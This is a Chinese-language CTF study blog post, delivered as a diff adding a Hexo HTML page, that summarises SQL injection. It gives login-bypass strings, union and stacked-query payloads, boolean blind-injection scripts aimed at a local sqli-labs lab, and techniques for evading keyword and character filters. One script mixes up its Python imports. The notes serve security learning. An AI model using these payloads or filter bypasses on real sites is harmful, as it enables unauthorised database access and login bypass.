@@ -1,0 +1,524 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="SQL注入总结">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入">
+<meta property="og:url" content="http://yoursite.com/2020/07/29/SQL%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="jkjk">
+<meta property="og:description" content="SQL注入总结">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-07-29T08:24:59.000Z">
+<meta property="article:modified_time" content="2020-08-02T10:05:04.139Z">
+<meta property="article:author" content="Du11JK">
+<meta property="article:tag" content="CTF - Web">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://yoursite.com/2020/07/29/SQL%E6%B3%A8%E5%85%A5/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>SQL注入 | jkjk</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="jkjk" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">jkjk</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="th fa-fw"></i>目录</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/29/SQL%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/a.jpg">
+      <meta itemprop="name" content="Du11JK">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="jkjk">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SQL注入
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-07-29 16:24:59" itemprop="dateCreated datePublished" datetime="2020-07-29T16:24:59+08:00">2020-07-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-08-02 18:05:04" itemprop="dateModified" datetime="2020-08-02T18:05:04+08:00">2020-08-02</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/note/" itemprop="url" rel="index"><span itemprop="name">note</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="SQL注入总结"><a href="#SQL注入总结" class="headerlink" title="SQL注入总结"></a>SQL注入总结</h1><a id="more"></a>
+
+<h2 id="常规操作流程："><a href="#常规操作流程：" class="headerlink" title="常规操作流程："></a>常规操作流程：</h2><p>1.测试有多少字段<br>2.爆出数据库名<br>3.爆出数据库里的表<br>4.爆出表的列名<br>5.爆出所有数据</p>
+<h2 id="常见注入方法："><a href="#常见注入方法：" class="headerlink" title="常见注入方法："></a>常见注入方法：</h2><h3 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39; or &#39;1&#39;&#x3D;&#39;1	&#x2F;&#x2F;select username,age from userinfo where id&#x3D;&#39;&#39; or &#39;1&#39;&#x3D;&#39;1&#39;</span><br><span class="line">&#39; or 1&#x3D;1#	&#x2F;&#x2F;select username,age from userinfo where id&#x3D;&#39;&#39; or 1&#x3D;1#&#39;</span><br><span class="line">&#39;&#x3D;0#		&#x2F;&#x2F;select username,age from userinfo where id&#x3D;&#39;&#39;&#x3D;0#</span><br></pre></td></tr></table></figure>
+
+<h3 id="union联合查询"><a href="#union联合查询" class="headerlink" title="union联合查询"></a>union联合查询</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xx&#39; union select 1,(select database()) #</span><br><span class="line">xx&#39; union select (select database()),2 or &#39;</span><br></pre></td></tr></table></figure>
+
+<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show databases;#</span><br><span class="line">1&#39;;show tables from supersqli;#</span><br><span class="line">1&#39;;show columns from __;</span><br></pre></td></tr></table></figure>
+
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>页面只返回True和False两种类型页面。利用页面返回不同，逐个猜解数据<br>常用函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Length()		<span class="comment">//函数 返回字符串的长度</span></span><br><span class="line">Substr()		<span class="comment">//截取字符串</span></span><br><span class="line">Ascii()			<span class="comment">//返回字符的ascii码</span></span><br><span class="line">sleep(n)		<span class="comment">//将程序挂起一段时间 n为n秒</span></span><br><span class="line"><span class="keyword">if</span>(expr1,expr2,expr3)	<span class="comment">//判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</span></span><br></pre></td></tr></table></figure>
+
+<p>脚本模板：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern = re.compile(<span class="string">r'2014-11-16'</span>) <span class="comment">#此处是关键字</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> count <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> character <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">        payload = <span class="string">'user()'</span></span><br><span class="line">        request = urllib2.Request(<span class="string">''</span>)</span><br><span class="line">                <span class="comment">#其中单引号中放注入的url</span></span><br><span class="line">        request.add_header(<span class="string">'User-Agent'</span>,<span class="string">''</span>)</span><br><span class="line">                <span class="comment">#其中单引号中放User-Agent对应的东东！</span></span><br><span class="line">        response = urllib2.urlopen(request)</span><br><span class="line">        <span class="comment">#print character</span></span><br><span class="line">        match = pattern.search(response.read())</span><br><span class="line">        <span class="keyword">if</span> match:</span><br><span class="line">            <span class="keyword">if</span> character == <span class="number">0</span>:</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'%d -- %s'</span>%(count,chr(character))</span><br><span class="line">                <span class="comment">#print match.group()</span></span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>爆数据库：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">database_len</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">		url = <span class="string">'''http://127.0.0.1/sqli-labs-master/Less-8/index.php'''</span></span><br><span class="line">		payload = <span class="string">'''?id=1' and length(database())&gt;%s'''</span> %i</span><br><span class="line">		<span class="comment"># print(url+payload+'%23')</span></span><br><span class="line">		r = requests.get(url+payload+<span class="string">'%23'</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'You are in'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			print(i)</span><br><span class="line"> </span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="comment">#print('false')</span></span><br><span class="line">			print(<span class="string">'database_length:'</span>,i)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">database_len()</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">database_name</span><span class="params">()</span>:</span></span><br><span class="line">	name = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">'sqcwertyuioplkjhgfdazxvbnm'</span>:</span><br><span class="line">			url = <span class="string">"http://127.0.0.1/sqli-labs-master/Less-8/index.php?id=1' and substr(database(),%d,1)='%s'"</span> %(j,i)</span><br><span class="line">			<span class="comment"># print(url+'%23')</span></span><br><span class="line">			r = requests.get(url+<span class="string">'%23'</span>)</span><br><span class="line">			<span class="keyword">if</span> <span class="string">'You are in'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">				name = name+i</span><br><span class="line">				</span><br><span class="line">				print(name)</span><br><span class="line">				</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">	print(<span class="string">'database_name:'</span>,name)</span><br><span class="line">	</span><br><span class="line">		</span><br><span class="line">	</span><br><span class="line">database_name()</span><br></pre></td></tr></table></figure>
+<h2 id="绕过方法："><a href="#绕过方法：" class="headerlink" title="绕过方法："></a>绕过方法：</h2><h3 id="注释符号绕过"><a href="#注释符号绕过" class="headerlink" title="注释符号绕过"></a>注释符号绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-- 注释内容</span><br><span class="line"># 注释内容</span><br><span class="line">&#x2F;*注释内容*&#x2F;</span><br><span class="line">;</span><br></pre></td></tr></table></figure>
+
+<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><blockquote>
+<p>某些关键字可能被过滤，利用sql语句对大小写不敏感的特点，可以任意变换关键字大小写来绕过过滤；</p>
+</blockquote>
+<h3 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h3><blockquote>
+<p>内联注释就是把一些特有的仅在MYSQL上的语句放在 /<em>!…</em>/ 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。</p>
+</blockquote>
+<h3 id="双写关键字绕过"><a href="#双写关键字绕过" class="headerlink" title="双写关键字绕过"></a>双写关键字绕过</h3><blockquote>
+<p>在某一些简单的waf中，将关键字select等只使用replace()函数置换为空，这时候可以使用双写关键字绕过。例如select变成seleselectct，在经过waf的处理之后又变成select，达到绕过的要求</p>
+</blockquote>
+<h3 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**&#x2F;</span><br><span class="line">()</span><br><span class="line">回车(url编码中的%0a)</span><br><span class="line">&#96;(tap键上面的按钮)</span><br><span class="line">tap</span><br><span class="line">两个空格</span><br></pre></td></tr></table></figure>
+
+<h3 id="过滤or-and-xor-not-绕过"><a href="#过滤or-and-xor-not-绕过" class="headerlink" title="过滤or and xor not 绕过"></a>过滤or and xor not 绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">and &#x3D; &amp;&amp;</span><br><span class="line">or &#x3D; ||</span><br><span class="line">xor &#x3D; |</span><br><span class="line">not &#x3D; !</span><br></pre></td></tr></table></figure>
+<h3 id="过滤等号-绕过"><a href="#过滤等号-绕过" class="headerlink" title="过滤等号=绕过"></a>过滤等号=绕过</h3><blockquote>
+<p>1.不加通配符的like执行的效果和=一致，所以可以用来绕过<br>2.rlike:模糊匹配，只要字段的值中存在要查找的 部分 就会被选择出来<br>用来取代=时，rlike的用法和上面的like一样，没有通配符效果和=一样<br>3.regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配<br>4.使用大小于号来绕过<br>5.&lt;&gt; 等价于 !=，所以在前面再加一个!结果就是等号了<br>6.等号绕过也可以使用strcmp(str1,str2)函数、between关键字等</p>
+</blockquote>
+<h3 id="过滤逗号绕过"><a href="#过滤逗号绕过" class="headerlink" title="过滤逗号绕过"></a>过滤逗号绕过</h3><p><code>from pos for len</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">substr</span>(<span class="string">"string"</span>,<span class="number">1</span>,<span class="number">3</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">substr</span>(<span class="string">"string"</span> <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">3</span>);</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b <span class="keyword">join</span>(<span class="keyword">select</span> <span class="number">3</span>)c</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">2</span>,<span class="number">1</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">2</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="过滤函数绕过"><a href="#过滤函数绕过" class="headerlink" title="过滤函数绕过"></a>过滤函数绕过</h3><blockquote>
+<p>sleep() –&gt;benchmark()<br>ascii()–&gt;hex()、bin()<br>group_concat()–&gt;concat_ws()<br>substr(),substring(),mid()<br>user() –&gt; @@user、datadir–&gt;@@datadir<br>ord()–&gt;ascii()</p>
+</blockquote>
+<p>参考：<br><a href="https://blog.csdn.net/huanghelouzi/article/details/82995313" target="_blank" rel="noopener">https://blog.csdn.net/huanghelouzi/article/details/82995313</a><br><a href="https://blog.csdn.net/weixin_40709439/article/details/81355856" target="_blank" rel="noopener">https://blog.csdn.net/weixin_40709439/article/details/81355856</a><br><a href="https://www.dazhuanlan.com/2019/12/09/5dee2bf66bd36/" target="_blank" rel="noopener">https://www.dazhuanlan.com/2019/12/09/5dee2bf66bd36/</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF-Web/" rel="tag"># CTF - Web</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/07/28/week20200727-20200802/" rel="prev" title="week20200727-20200802">
+      <i class="fa fa-chevron-left"></i> week20200727-20200802
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/08/02/OEP%E5%85%A5%E5%8F%A3%E6%9F%A5%E6%89%BE%E5%92%8C%E5%9F%BA%E6%9C%AC%E5%A3%B3%E7%9A%84%E8%AF%86%E5%88%AB/" rel="next" title="OEP入口查找和基本壳的识别">
+      OEP入口查找和基本壳的识别 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL注入总结"><span class="nav-number">1.</span> <span class="nav-text">SQL注入总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#常规操作流程："><span class="nav-number">1.1.</span> <span class="nav-text">常规操作流程：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常见注入方法："><span class="nav-number">1.2.</span> <span class="nav-text">常见注入方法：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#万能密码"><span class="nav-number">1.2.1.</span> <span class="nav-text">万能密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#union联合查询"><span class="nav-number">1.2.2.</span> <span class="nav-text">union联合查询</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#堆叠注入"><span class="nav-number">1.2.3.</span> <span class="nav-text">堆叠注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#布尔盲注"><span class="nav-number">1.2.4.</span> <span class="nav-text">布尔盲注</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过方法："><span class="nav-number">1.3.</span> <span class="nav-text">绕过方法：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#注释符号绕过"><span class="nav-number">1.3.1.</span> <span class="nav-text">注释符号绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#大小写绕过"><span class="nav-number">1.3.2.</span> <span class="nav-text">大小写绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#内联注释绕过"><span class="nav-number">1.3.3.</span> <span class="nav-text">内联注释绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#双写关键字绕过"><span class="nav-number">1.3.4.</span> <span class="nav-text">双写关键字绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#空格过滤绕过"><span class="nav-number">1.3.5.</span> <span class="nav-text">空格过滤绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#过滤or-and-xor-not-绕过"><span class="nav-number">1.3.6.</span> <span class="nav-text">过滤or and xor not 绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#过滤等号-绕过"><span class="nav-number">1.3.7.</span> <span class="nav-text">过滤等号&#x3D;绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#过滤逗号绕过"><span class="nav-number">1.3.8.</span> <span class="nav-text">过滤逗号绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#过滤函数绕过"><span class="nav-number">1.3.9.</span> <span class="nav-text">过滤函数绕过</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Du11JK"
+      src="/images/a.jpg">
+  <p class="site-author-name" itemprop="name">Du11JK</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Du11JK" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Du11JK" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="author" itemprop="copyrightHolder">Du11JK</span>
+</div>
+
+
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">总访客<span id="busuanzi_value_site_uv"></span>人</span>
+    <span class="post-meta-divider">|</span>
+
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
